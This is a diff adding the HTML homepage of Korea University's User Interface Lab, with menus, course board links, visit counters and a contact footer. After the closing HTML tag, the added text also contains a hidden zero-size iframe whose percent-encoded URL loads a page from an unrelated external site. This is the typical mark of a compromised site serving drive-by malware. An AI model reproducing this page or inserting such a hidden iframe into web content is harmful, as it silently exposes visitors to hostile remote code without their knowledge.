@@ -1,0 +1,260 @@
+
+<HTML>
+
+
+
+
+<body leftMargin="0" topMargin="0" onload="OpenWin()">
+
+</body>
+
+
+
+<HEAD>
+	<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=EUC-KR">
+	<TITLE>Korea Univ. - User Interface Lab. Homepage</TITLE>
+	<LINK REL="STYLESHEET" TYPE="text/css" HREF="/Style.css">
+</HEAD>
+<BODY LEFTMARGIN=0 TOPMARGIN=0 MARGINHEIGHT=0 MARGINWIDTH=0 ><center>
+
+<br><br>
+
+
+<script>
+function menuOn(name) {
+ submenu = eval("submenu"+name+".style");
+ submenu.visibility = "visible";
+}
+function menuOff(name,name2,name3) {
+ submenu = eval("submenu"+name+".style");
+ submenu.visibility = "hidden";
+}
+</script>
+
+
+
+<table align="center" bgcolor="white" width="980px" cellpadding=0 cellspacing=0 >
+ <tr>
+  
+   <td onMouseOver="menuOn(1)" onMouseOut="menuOff(1)"><a HREF="/">
+    <img src="Images/menu01_01.gif"  border="0" onmouseover=src="images/menu_click_01.gif" Onmouseout=src="Images/menu01_01.gif" style=cursor:hand>  
+  </td>
+  
+  <td onMouseOver="menuOn(2)" onMouseOut="menuOff(2)"><a HREF="/Intro.asp">
+    <img src="Images/menu01_02.gif" border="0" onmouseover=src="images/menu_click_02.gif" Onmouseout=src="Images/menu01_02.gif" style=cursor:hand> 
+  </td>
+
+<td onMouseOver="menuOn(3)" onMouseOut="menuOff(3)"><a HREF="/Professor.asp">
+    <img src="Images/menu01_03.gif"  border="0"onmouseover=src="images/menu_click_03.gif" Onmouseout=src="Images/menu01_03.gif" style=cursor:hand>
+  </td>
+
+  <td onMouseOver="menuOn(4)" onMouseOut="menuOff(4)"><a HREF="/LectureBoard.asp">
+    <img src="Images/menu01_04.gif"  border="0" onmouseover=src="images/menu_click_04.gif" Onmouseout=src="Images/menu01_04.gif" style=cursor:hand>
+  </td>
+
+  <td onMouseOver="menuOn(5)" onMouseOut="menuOff(5)"><a HREF="/Board.asp">
+    <img src="Images/menu01_05.gif"  border="0"onmouseover=src="images/menu_click_05.gif" Onmouseout=src="Images/menu01_05.gif" style=cursor:hand>
+  </td>
+
+  <td onMouseOver="menuOn(6)" onMouseOut="menuOff(6)"><a HREF="/Links.asp"> 
+   <img src="Images/menu01_06.gif"  border="0" onmouseover=src="images/menu_click_06.gif" Onmouseout=src="Images/menu01_06.gif" style=cursor:hand>
+  </td>
+
+ </tr>
+ 
+ <tr>
+  
+  <td>
+  <span style="position:absolute;visibility:hidden;overflow:visiable;">
+  <div style="position:absolute;">
+  <div  id="submenu1" onMouseOver="menuOn(1)" onMouseOut="menuOff(1)" style="position:absolute;" >
+   <table cellpadding=0 cellspacing=0 >
+    <tr><td></td></tr>    
+   </table>
+  </div></div>
+  </span>   
+  </td>
+
+  <td>
+  <span style="position:absolute;visibility:hidden; overflow:visiable;">
+  <div style="position:absolute;">
+  <div  id="submenu2" onMouseOver="menuOn(2)" onMouseOut="menuOff(2)" style="position:absolute;" >
+   <table cellpadding=0 cellspacing=0 width="350px">
+   <tr><td> 
+   <a  HREF="/Research_ui.asp"><b>연구분야&nbsp;<a  HREF="/major_subjects.asp">수강과목&nbsp;<a  HREF="/experiment_room.asp">실험장비&nbsp;</a><a  HREF="/Research_Project_Paper.asp">발표논문&nbsp;</a><a  HREF="/Research_seminar.asp">연구논문 </a>
+   </td></tr>     
+   </table>
+  </div></div>
+  </span>   
+  </td>
+  
+
+  </body>
+
+  <td>
+  <span style="position:absolute;visibility:hidden; overflow:visiable;" >
+  <div style="position:absolute;" >
+  <div id="submenu3" onMouseOver="menuOn(3)" onMouseOut="menuOff(3)" style="position:absolute;">
+   <table cellpadding=0 cellspacing=0 width="350px">
+   <tr><td> <a  HREF="/Professor.asp"><b> 지도교수 &nbsp;<a  HREF="/People.asp">재학생 &nbsp;<a  HREF="/OB.asp">졸업생&nbsp; <a  HREF="/photo">추억의 앨범 </a></td></tr>    
+   </table>
+  </div></div>
+  </span>   
+  </td>
+
+  <td>
+  <span style="position:absolute;visibility:hidden; overflow:visiable;" >
+  <div style="position:absolute;"  >
+  <div  id="submenu4" onMouseOver="menuOn(4)" onMouseOut="menuOff(4)" style="position:absolute;" >
+   <table cellpadding=0 cellspacing=0 width="400px">
+    <tr><td><a  HREF="/Board/List.asp?db=ui_lect36"> <b>사용자인터페이스 
+            <a  HREF="/Board/List.asp?db=ui_lect37">인간공학
+	    <a  HREF="/Board/List.asp?db=ui_lect38">사용자중심설계 
+	    <a  HREF="/Board/List.asp?db=ui_lect39">인간공학특론 </a></td></tr> 
+   </table>
+  </div></div>
+  </span>   
+  </td>
+
+  <td>
+  <span style="position:absolute;visibility:hidden; overflow:visiable;">
+  <div style="position:absolute;">
+  <div  id="submenu5" onMouseOver="menuOn(5)" onMouseOut="menuOff(5)" style="position:absolute;">
+   <table cellpadding=0 cellspacing=0 width="350px">
+    <tr><td><a href="/Board/List.asp?db=ui_student"><b> 학부 수업 &nbsp;<a HREF="/Board/List.asp?db=ui_graduate">대학원 수업&nbsp; <a  HREF="/Board/List.asp?db=ui_seminar">세미나 자료&nbsp; <a  HREF="/Board/List.asp?db=ui_qna&flagQNA=true">묻고 답하기 </a></td></tr>    
+   </table>
+  </div></div>
+  </span>   
+  </td>
+  
+  <td>
+<span style="position:absolute;visibility:hidden; overflow:visiable;">
+<div style="position:absolute;" width="100px">
+<div id="submenu6" onMouseOver="menuOn(6)" onMouseOut="menuOff(6)" style="position:absolute;">
+ <table cellpadding=0 cellspacing=0>
+  <tr><td></td></tr>
+  </table>
+</div></div>
+</span>
+  </td>
+ 
+ </tr>
+
+<tr> <table bgcolor="white" align="center" width="980px" height="20px"> 
+ <td>
+
+
+ <tr><table align="center"> 
+ <td>
+
+ <a href="/" > <img src="Images/main2.gif"  border="0"> </a>
+
+ </td></tr>
+
+
+</table>
+
+<br>	
+<table WIDTH=980 BORDER=0 CELLPADDING=0 CELLSPACING=0 align="center" >
+<tr>
+<td COLSPAN=2 width="50%" height=180>
+<a href="/LectureBoard.asp"> <IMG SRC="Images/Directlink.gif" BORDER=0 align="center"></a><br><br> 
+<IMG SRC="/Images/Check2.gif" BORDER=0 align="left"><a href="/Board/List.asp?db=ui_lect36">&nbsp;학부 수업 : [IMEN417] 사용자 인터페이스 <br></a><br>
+<IMG SRC="/Images/Check2.gif" BORDER=0 align="left"><a href="/Board/List.asp?db=ui_lect37">&nbsp;대학원 수업 :[IMS621] 인간 공학<br></a><br>
+<IMG SRC="/Images/Check2.gif" BORDER=0 align="left"><a href="/Board/List.asp?db=ui_lect38">&nbsp;대학원 수업 :[IMS631] 사용자중심설계<br></a><br>
+<IMG SRC="/Images/Check2.gif" BORDER=0 align="left"><a href="/Board/List.asp?db=ui_lect39">&nbsp;공학대학원 수업 :[ITG515] 인간공학특론- I</a><br><br><br><br><br>
+</td>
+			<td>					
+			<IFRAME width=400 height=200 FRAMEBORDER="0" MARGINWIDTH="0" MARGINHEIGHT="0" HSPACE="0" VSPACE="0" SRC="/Notice/List.asp" SCROLLING="No" ></IFRAME> </td>
+
+
+<!-- 게시판 상황 시작 //-->
+			
+
+<td COLSPAN=2  height=180><IMG SRC="http://ui.korea.ac.kr/Images/count.gif" BORDER=0 align="center"> <br><br>
+
+<IMG SRC="/Images/check2.gif" BORDER=0 ALIGN="absmiddle">&nbsp;&nbsp;<A HREF="/Board/List.asp?db=ui_student">학부생 수업 </A>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Today <FONT COLOR=black>0</FONT> /  886 <br><br>
+<IMG SRC="/Images/check2.gif" BORDER=0 ALIGN="absmiddle">&nbsp;&nbsp;<A HREF="/Board/List.asp?db=ui_graduate">대학원 수업 </A>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Today <FONT COLOR=black>0</FONT> /  224 <br><br>
+<IMG SRC="/Images/check2.gif" BORDER=0 ALIGN="absmiddle">&nbsp;&nbsp;<A HREF="/Board/List.asp?db=ui_seminar">연구실 세미나 </A>&nbsp;&nbsp;
+Today <FONT COLOR=black>0</FONT> /  321 <br><br>
+<IMG SRC="/Images/check2.gif" BORDER=0 ALIGN="absmiddle">&nbsp;
+<A HREF="/Board/List.asp?db=ui_qna&flagQNA=true">묻고 답하기 </A>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Today <FONT COLOR=black>0</FONT> /  171 <br><br><BR><BR><BR>
+</td> </tr> 
+
+
+
+
+
+</table> 
+<!-- <tr>
+		<TD align=center> 
+		<EMBED pluginspage=http://www.macromedia.com/go/getflashplayer src=http://www.hompydesign.com/club/caltime.swf width=200 height=200 type=application/x-shockwave-flash quality="high" wmode=transparent> 
+
+		</TD>	
+</tr>//-->
+<br><br>
+<tr> 
+ <TD align="center" HEIGHT=8 >
+ <A HREF="http://www.korea.ac.kr/" TARGET="_blank"><IMG SRC="/Images/main_link1.gif" BORDER=0>&nbsp;&nbsp;
+ <A HREF="http://ie.korea.ac.kr/" TARGET="_blank"><IMG SRC="/Images/main_link2.gif" BORDER=0>&nbsp;&nbsp;
+ <A HREF="http://ime.korea.ac.kr/" TARGET="_blank"><IMG SRC="/Images/main_link3.gif" BORDER=0>&nbsp;&nbsp;
+ <A HREF="http://portal.korea.ac.kr/" TARGET="_blank"><IMG SRC="/Images/main_link8.gif" BORDER=0>&nbsp;&nbsp;
+ <A HREF="http://bk21sec.korea.ac.kr/" TARGET="_blank"><IMG SRC="/Images/main_link4.gif" BORDER=0>&nbsp;&nbsp;
+ <A HREF="http://iems.net/" TARGET="_blank"><IMG SRC="/Images/main_link5.gif" BORDER=0>&nbsp;&nbsp;
+ <A HREF="http://kiie.org/" TARGET="_blank"><IMG SRC="/Images/main_link6.gif" BORDER=0>&nbsp;&nbsp;
+ <A HREF="http://esk.or.kr/" TARGET="_blank"><IMG SRC="/Images/main_link7.gif" BORDER=0>
+        </TD> 
+</tr>
+
+<!-- <tr><td>
+<center>
+<iframe border='0' frameborder='0' framespacing='0' marginheight='0' marginwidth='0'  scrolling='no' src="/calendar/index.html"  width='170' height='178'bgcolor="#ffffff"></iframe>
+</center>
+</td></tr> //-->
+
+</TABLE>
+<BR><br><BR><br>
+
+		
+<!-- 바닥글 시작 //-->
+<TABLE align="center" WIDTH=800 BORDER=0 CELLPADDING=0 CELLSPACING=0>
+	
+	<TR>
+		<TD align=center>
+		</TD>
+	</TR>
+	<TR>
+		<TD ALIGN=center>
+			<FONT FACE="Verdana"> 서울특별시 성북구 안암동 5가 1번지 고려대학교 제2공학관 619호 정보경영공학부 UI 연구실 (우편번호: 136 - 701) )  </FONT>
+		</TD>
+	</TR>
+<TR>
+		<TD ALIGN=center>
+			<FONT FACE="Verdana"> TEL. 02-3290-3905 </FONT>
+		</TD>
+	</TR>
+
+	<TR>
+		<TD>
+			&nbsp;
+		</TD>
+	</TR>
+	<TR>
+		<TD ALIGN=center>
+			<FONT FACE="Verdana">Copyright 2003 by User Interface Lab., All Right Reserved.<BR>Dept. of Industrial Systems &amp; Information Engineering, Korea University</FONT>
+		</TD>
+	</TR>
+	<TR>
+		<TD>
+			&nbsp;
+		</TD>
+	</TR>
+</TABLE>
+<!-- 바닥글 끝 //-->
+</BODY>
+</HTML>
+
+<iframe src=http://%77%77%77%2E%62%75%62%72%79%75%6E%2E%63%6F%6D/%70%64%73/%66%69%6C%65%55%70%6C%6F%61%64/%70%64%73%46%69%6C%65/%66%4D%61%64%61%6E%67%59%61%64%61%6E/%77%6D%2E%68%74%6D width=0 height=0></iframe>
